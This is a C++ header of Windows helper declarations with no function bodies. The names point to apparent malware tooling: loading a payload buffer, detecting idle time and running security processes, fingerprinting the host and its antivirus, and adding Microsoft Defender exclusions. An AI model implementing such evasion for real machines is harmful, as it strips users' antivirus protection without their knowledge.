#pragma once

#include <vector>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <locale>
#include <unordered_map>
#include <codecvt>

BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size);
void free_buffer(BYTE* buffer);

std::string buildCommandFromTemplate(
    const std::string& template_str,
    const std::unordered_map<std::string, std::string>& replacements
);

bool IsDeviceIdle(int minutes);

LPWSTR StringToLPWSTR(const std::string& str);

std::string GetWindowsUsername();

int GetSystemUptimeMinutes();

wchar_t* get_file_name(wchar_t *full_path);

bool IsAnotherInstanceRunning(const char* mutexName);

wchar_t* get_directory(IN wchar_t *full_path, OUT wchar_t *out_buf, IN const size_t out_buf_size);
bool AreProcessesRunning(const std::vector<std::string>& processNames);

// System info functions
std::string GetCPUName();
std::string GetGPUName();
std::string GetComputerHash();
std::string GetAntivirusName();

// Admin and security functions
bool IsRunningAsAdmin();
bool AddDefenderExclusion(const std::string& path);

